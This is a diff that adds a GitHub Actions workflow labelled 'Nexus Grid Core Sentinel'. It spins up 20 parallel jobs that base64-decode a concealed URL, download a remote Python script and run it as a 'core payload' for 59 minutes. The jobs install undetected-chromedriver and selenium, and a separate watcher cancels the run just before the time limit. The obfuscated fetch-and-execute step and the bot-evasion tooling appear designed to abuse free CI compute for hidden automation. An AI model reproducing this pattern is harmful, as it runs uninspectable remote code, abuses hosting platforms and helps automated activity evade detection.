@@ -1,0 +1,106 @@
+name: Nexus Grid Core Sentinel
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ncg-core-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watcher: waits 59 minutes then cancels the entire workflow run
+  # =================================================================
+  grid-watcher:
+    name: "Grid Watcher Node"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCH_DURATION: 3540
+    steps:
+      - name: Initialize Watcher
+        run: |
+          echo "[WATCHER] Watcher online for session: ${{ github.run_id }}"
+          echo "[WATCHER] Monitoring execution for ${WATCH_DURATION} seconds (59-minute threshold)."
+
+          sleep "${WATCH_DURATION}"
+
+          echo "[WATCHER] Threshold reached — issuing termination command."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHER] Termination signal sent. All active and pending tasks will be halted."
+
+  # =================================================================
+  # Worker Grid: parallel execution of core nodes
+  # =================================================================
+  worker-grid:
+    name: "Node-${{ matrix.node_token }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_token: [alpha-101, beta-102, gamma-103, delta-104, omega-105, 
+                     zeta-201, eta-202, theta-203, iota-204, kappa-205, 
+                     lambda-301, mu-302, nu-303, xi-304, omicron-305, 
+                     pi-401, rho-402, sigma-403, tau-404, upsilon-405]
+
+    steps:
+      # #################################################################
+      # Stage 1: Setup environment
+      # #################################################################
+      - name: Prepare Environment
+        run: |
+          echo "[SETUP] Configuring Node-${{ matrix.node_token }} environment..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # Stage 2: Fetch execution payload
+      # #################################################################
+      - name: Fetch Core Payload
+        run: |
+          echo "[FETCH] Downloading core payload from remote source..."
+          PAYLOAD_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$PAYLOAD_URL" -o core_engine.py
+          echo "[FETCH] Core payload secured."
+
+      # #################################################################
+      # Stage 3: Install dependencies
+      # #################################################################
+      - name: Install Dependencies
+        run: |
+          echo "[DEPS] Installing required Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # Stage 4: Execute core engine (59-minute limit)
+      # #################################################################
+      - name: Execute Core Engine
+        run: |
+          echo ">> Starting Node-${{ matrix.node_token }} execution..."
+
+          python3 core_engine.py &
+          ENGINE_PID=$!
+
+          echo ">> Engine running. Maximum allotted time: 59 minutes (3540s)."
+
+          sleep 3540
+
+          if kill -0 "$ENGINE_PID" 2>/dev/null; then
+            echo ">> Time limit reached — stopping engine process."
+            kill -9 "$ENGINE_PID"
+            echo ">> Engine process forcefully terminated by supervisor."
+          else
+            echo ">> Engine process finished successfully before timeout."
+          fi
